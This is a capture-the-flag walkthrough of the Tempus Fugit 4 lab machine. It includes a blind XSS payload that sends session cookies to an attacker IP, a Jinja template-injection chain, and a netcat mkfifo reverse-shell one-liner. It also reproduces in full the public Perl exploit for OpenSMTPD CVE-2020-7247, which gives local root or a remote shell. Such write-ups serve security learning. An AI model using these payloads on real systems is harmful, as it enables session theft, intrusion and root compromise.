# Tempus Fugit: 4 Walkthrough 

# Description
```bash
Tempus Fugit is a Latin phrase that roughly translated as “time flies”.

This is an hard, real life box, created by @4nqr34z and @theart42.

As in the former Tempus Fugits, #4 the idea is still to create something “out of the ordinary”.

Need any hints? Feel free to contact us on Twitter: @4nqr34z or @theart42

DHCP-Client.

Tested and works both on Virtualbox and vmware

Story:
After being hacked multiple times, the company decides to do things differently this time. They left Linux and choose another operating system that claimed to be more secure. Realising they could have resources inside the company that are willing to help the relative small IT department (originally only web-designers) and the fact (according to Hugh Janus) there are safety in numbers, they start a internal crowdsourcing project. Allowing internal employees to request access to the new server.

```

# Exploiation
Let's start with a network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 20 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1200                                                                                                                                                
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     f0:a7:31:e9:bb:f8      7     420  TP-Link Systems Inc                                                                                                                                            
 192.168.0.100   58:11:22:85:0d:41     12     720  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.108   08:00:27:56:d8:0d      1      60  PCS Systemtechnik GmbH   
```
\
Next open ports
```bash
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
80/tcp open  http    nginx 1.16.1
```
\
Opening port 80
\
<img width="1642" height="692" alt="image" src="https://github.com/user-attachments/assets/3f0d54fd-e1df-4b96-b14f-349fc955502f" />
\
Then when i searched for directories i found
\
<img width="1449" height="778" alt="image" src="https://github.com/user-attachments/assets/9c5af20e-7244-4198-b181-fbe0529e7b8a" />
\
When we click on request access
\
<img width="894" height="375" alt="image" src="https://github.com/user-attachments/assets/97c92884-0ff4-4d06-9f4c-16a83e7189d4" />
\
Then after some trials and errors , i realized that there was a Blind XSS in this page and used the payload
```bash
aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie>
```
\
And got this back
```bash
python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.108 - - [23/Apr/2026 10:28:08] "GET /?c=session=.eJwlz8uqAjEQBNB_ydpFvybp-DND0g8UQWFGV5f77wakdgUFp_7Knkect3J9H5-4lP3u5VqIQNWls2FItHToZn0Dyw2UEtyGtGoyK224sRESr6pylwlDwlBgDoOwldrDGTLAG9Zk465AjIyulc2bA1FQivbMoeQqVC7FziP39-sRz-VJBh1tgoxK2CZ7VFmIRjE71bmImMrN1-5zxvE7IeX_C4sjPs4.aep5yQ.0it_0r1e0aH10l4oAh4KdgFQjgs HTTP/1.1" 200 -
```
\
Then after that we are able to access the staff page
\
<img width="1720" height="747" alt="image" src="https://github.com/user-attachments/assets/8774e7ea-0bfc-472d-80d1-587b2d814b25" />
\
Anyways , since i could not check out the logs tab , since it kept redirecting to my hosted link , i curl'd it
```bash
<div class="jumbotron bg-dark text-white">
  <h1>Logfiles</h1>

  <form action="/admin/logs">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImJiODJhODcwYWFlZWZjYjliODFmOTgzMWQ2ZTIwMTY1M2VhZDVlNjEi.aep73g.csCnKsEOqKOoKe2VkBjGXfQtJUE">
  <label for="log">Logfile: </label>
  <select id="log" name="log"><option selected value="accessrequest.txt">Access requests</option><option value="/var/www/logs/access.log">Website Requests</option><option value="requests.txt">Adminsite Request</option></select>

  <input id="submit" name="submit" type="submit" value="Submit">
<hr>
  </div>
  <pre>
  

    aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie> aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie>
aaa<svg onload=document.location='http://192.168.0.124:9000/?c='+document.cookie> aaa<svg onload=document.location='http://192.168.0.124:9000/?c='+document.cookie>
a<svg onload=document.location='http://192.168.0.124:9001/cookies.php?c='+document.cookie;> a<svg onload=document.location='http://192.168.0.124:9001/cookies.php?c='+document.cookie;>


```
\
Here i saw my previous attempts to get the cookie and there is a drop box with 3 options 
```bash
Access requests : accessrequest.txt
Website requests : /var/www/logs/access.log
Adminsite Request : requests.txt
```
\
Then i send a curl request through my burp proxy and capture this when i wanted to see requests.txt
\
<img width="1393" height="673" alt="image" src="https://github.com/user-attachments/assets/0ec14010-5151-4db9-a452-625dfa6d416c" />
\
<img width="287" height="131" alt="image" src="https://github.com/user-attachments/assets/2c78c5a4-b3ac-4de5-a934-b105f672e086" />
\
In these logs , we can see a basic Auth header being used which just says Granted
\
<img width="304" height="158" alt="image" src="https://github.com/user-attachments/assets/27de8fbd-3174-4392-9646-32ea57b18b2d" />
\
Then i add that cookie and i can access the shell page
\
<img width="1688" height="553" alt="image" src="https://github.com/user-attachments/assets/7350b148-cbe2-4802-9545-aa874e993113" />
\
After looking at a hint , i understood that there was a Flask Jinja Template injection in the base64 decoded version of the "Auth" cookie
\
<img width="1679" height="604" alt="image" src="https://github.com/user-attachments/assets/f6480332-fc92-4978-bc3e-658dcd5dedf9" />
\
To get this log , we need to make a request to "/admin/" with this new Auth cookie and then GET request to logs to see it
\
Then i started referring to "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md" to get some syntax payloads
\
<img width="1692" height="626" alt="image" src="https://github.com/user-attachments/assets/80cd09d3-b78a-440c-b6e2-6cf9c403cc31" />
\
Here it gave list of all config items present
\
Now testing this payload "{{''.__class__.mro()[1].__subclasses__()}}" 
<img width="1671" height="663" alt="image" src="https://github.com/user-attachments/assets/b9a91e72-b6bc-48c4-84e6-37c49c4f409f" />
\
then i saved it all into a text file and converted into 1 line each class , and then used grep to find line number of Popen class
\
<img width="555" height="58" alt="image" src="https://github.com/user-attachments/assets/88d2a5e9-813b-4368-9092-18654c9d36bb" />
\
Its at line 412 , so its index in the list is 411
\
Then using this payload example
\
<img width="1114" height="159" alt="image" src="https://github.com/user-attachments/assets/f1d07c75-2cc0-4143-8032-5855874dfb0e" />
\
I got code execution
\
<img width="1722" height="633" alt="image" src="https://github.com/user-attachments/assets/0b8b5001-d4a8-43b6-9d1d-a8e422f79d18" />
\
<img width="920" height="498" alt="image" src="https://github.com/user-attachments/assets/539eee25-88c2-4227-8346-d02485558733" />
\
After lot of tries , i had to use the port 80 in my payload ( Because only main ports like 80 and 443 are allowed in strict firewall rules ) , ans this was the final one
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.0.124 80 >/tmp/f
```
\
<img width="1411" height="39" alt="image" src="https://github.com/user-attachments/assets/9816d662-14fe-4463-90c8-b73173523936" />
\
then i found users and then some data
\
<img width="594" height="534" alt="image" src="https://github.com/user-attachments/assets/d7ba694c-dad8-414d-b400-3d29117fa99b" />
\
<img width="674" height="551" alt="image" src="https://github.com/user-attachments/assets/58f913c2-6824-459f-b074-e59bd76f7b66" />
\
<img width="649" height="133" alt="image" src="https://github.com/user-attachments/assets/48710c65-f0e4-49cb-80be-2d1afb807ee9" />
\
Port 25 is open only for its local address ,and searching for known exploit on searchsploit 
\
<img width="1695" height="148" alt="image" src="https://github.com/user-attachments/assets/46afdc86-9427-4b82-b3bf-c0b94fea7d37" />
\
Then i had to use this perl payload after knowing that perl is installed on the target machine
```bash
# Exploit Title: OpenSMTPD 6.6.1 - Local Privilege Escalation
# Date: 2020-02-02
# Exploit Author: Marco Ivaldi
# Vendor Homepage: https://www.opensmtpd.org/
# Version: OpenSMTPD 6.4.0 - 6.6.1
# Tested on: OpenBSD 6.6, Debian GNU/Linux bullseye/sid with opensmtpd 6.6.1p1-1
# CVE: CVE-2020-7247

#!/usr/bin/perl

#
# raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
# Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and
# other products, allows remote attackers to execute arbitrary commands as root
# via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL
# FROM field. This affects the "uncommented" default configuration. The issue
# exists because of an incorrect return value upon failure of input validation
# (CVE-2020-7247).
#
# "Wow. I feel all butterflies in my tummy that bugs like this still exist. 
# That's awesome :)" -- skyper
#
# This exploit targets OpenBSD's OpenSMTPD in order to escalate privileges to
# root on OpenBSD in the default configuration, or execute remote commands as 
# root (only in OpenSMTPD "uncommented" default configuration).
#
# See also:
# https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
# https://poolp.org/posts/2020-01-30/opensmtpd-advisory-dissected/
# https://www.kb.cert.org/vuls/id/390745/
# https://www.opensmtpd.org/security.html
#
# Usage (LPE):
# phish$ uname -a
# OpenBSD phish.fnord.st 6.6 GENERIC#353 amd64
# phish$ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor), 0(wheel)
# phish$ ./raptor_opensmtpd.pl LPE
# [...]
# Payload sent, please wait 5 seconds...
# -rwsrwxrwx  1 root  wheel  12432 Feb  1 21:20 /usr/local/bin/pwned
# phish# id
# uid=0(root) gid=0(wheel) groups=1000(raptor), 0(wheel)
#
# Usage (RCE):
# raptor@eris ~ % ./raptor_opensmtpd.pl RCE 10.0.0.162 10.0.0.24 example.org
# [...]
# Payload sent, please wait 5 seconds...
# /bin/sh: No controlling tty (open /dev/tty: Device not configured)
# /bin/sh: Can't find tty file descriptor
# /bin/sh: warning: won't have full job control
# phish# id
# uid=0(root) gid=0(wheel) groups=0(wheel)
#
# Vulnerable platforms (OpenSMTPD 6.4.0 - 6.6.1):
# OpenBSD 6.6 [tested]
# OpenBSD 6.5 [untested]
# OpenBSD 6.4 [untested]
# Debian GNU/Linux bullseye/sid with opensmtpd 6.6.1p1-1 [tested]
# Other Linux distributions [untested]
# FreeBSD [untested]
# NetBSD [untested]
# 

use IO::Socket::INET;

print "raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD\n";
print "Copyright (c) 2020 Marco Ivaldi <raptor\@0xdeadbeef.info>\n\n";

$usage = "Usage:\n".
"$0 LPE\n".
"$0 RCE <remote_host> <local_host> [<domain>]\n";
$lport = 4444;

($type, $rhost, $lhost, $domain) = @ARGV;
die $usage if (($type ne "LPE") && ($type ne "RCE"));

# Prepare the payload
if ($type eq "LPE") { # LPE
	$payload = "cp /bin/sh /usr/local/bin/pwned\n".
	"echo 'main(){setuid(0);setgid(0);system(\"/bin/sh\");}' > /tmp/pwned.c\n".
	"gcc /tmp/pwned.c -o /usr/local/bin/pwned\nchmod 4777 /usr/local/bin/pwned";
	$rhost = "127.0.0.1";
} else { # RCE
	die $usage if ((not defined $rhost) || (not defined $lhost));
	$payload = "sleep 5;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|".
	"nc $lhost $lport >/tmp/f";
}

# Open SMTP connection
$| = 1;
$s = IO::Socket::INET->new("$rhost:25") or die "Error: $@\n";

# Read SMTP banner
$r = <$s>;
print "< $r";
die "Error: this is not OpenSMTPD\n" if ($r !~ /OpenSMTPD/);

# Send HELO
$w = "HELO fnord";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send evil MAIL FROM
$w = "MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send RCPT TO
if (not defined $domain) {
	$rcpt = "<root>";
} else {
	$rcpt = "<root\@$domain>";
}
$w = "RCPT TO:$rcpt";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Send payload in DATA
$w = "DATA";
print "> $w\n";
print $s "$w\n";
$r = <$s>;
print "< $r";
$w = "\n#0\n#1\n#2\n#3\n#4\n#5\n#6\n#7\n#8\n#9\n#a\n#b\n#c\n#d\n$payload\n.";
#print "> $w\n"; # uncomment for debugging
print $s "$w\n";
$r = <$s>;
print "< $r";
die "Error: expected 250\n" if ($r !~ /^250/);

# Close SMTP connection
$s->close();
print "\nPayload sent, please wait 5 seconds...\n";

# Got root?
if ($type eq "LPE") { # LPE
	sleep 5;
	print `ls -l /usr/local/bin/pwned`;
	exec "/usr/local/bin/pwned" or die "Error: exploit failed :(\n";
} else { # RCE
	exec "nc -vl $lport" or die "Error: unable to execute netcat\n"; # BSD netcat
	#exec "nc -vlp $lport" or die "Error: unable to execute netcat\n"; # Debian netcat
}
```
\
Then i had to modify these lines
\
<img width="719" height="268" alt="image" src="https://github.com/user-attachments/assets/9f0e590b-0b77-49e2-a787-f04e54ba34e2" />
\
And use this command
\
<img width="503" height="21" alt="image" src="https://github.com/user-attachments/assets/c12cf151-a5f4-4fd4-864f-36f6876accad" />
\
To trigger the reverse shell as root
\
<img width="1001" height="717" alt="image" src="https://github.com/user-attachments/assets/077b86eb-31b8-45fc-99ee-7b5091c62a5a" />
\
And this is the user flag
\
<img width="1705" height="655" alt="image" src="https://github.com/user-attachments/assets/2eb30a78-71c6-4af9-84c6-986431912098" />
\
The end , Thank you for reading till here
